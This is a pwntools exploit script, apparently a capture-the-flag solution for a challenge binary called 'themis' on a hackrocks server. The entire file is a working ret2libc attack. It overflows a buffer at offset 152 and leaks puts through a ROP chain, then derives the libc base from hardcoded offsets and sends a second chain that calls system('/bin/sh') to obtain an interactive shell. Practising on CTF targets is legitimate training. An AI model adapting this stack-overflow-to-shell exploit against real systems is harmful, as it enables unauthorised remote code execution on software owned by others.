#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './themis'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'challenges.hackrocks.com', 27383

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

# Got manually through cyclic gdb-pwndbg
offset = 152

# flattening  payload here
payload = flat({
    offset: [
        rop.rdi.address,
        elf.got['puts'],
        elf.sym['puts'],
        elf.sym['mesg']    
    ]
})

io.sendlineafter(b'to you.', payload)

io.recvline()
leak = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
info('puts: %#x', leak)

# libc6_2.31-13_amd64 
libc.address = leak - 0x0765f0
binsh = libc.address + 0x18a152
system = libc.address + 0x048e50

info('libc: %#x', libc.address)
info('/bin/sh: %#x', binsh)
info('system: %#x', system)

# flattening  payload here
payload = flat({
    offset: [
        rop.rdi.address,
        binsh,
        system
    ]
})

io.sendlineafter(b'to you.', payload)

io.interactive()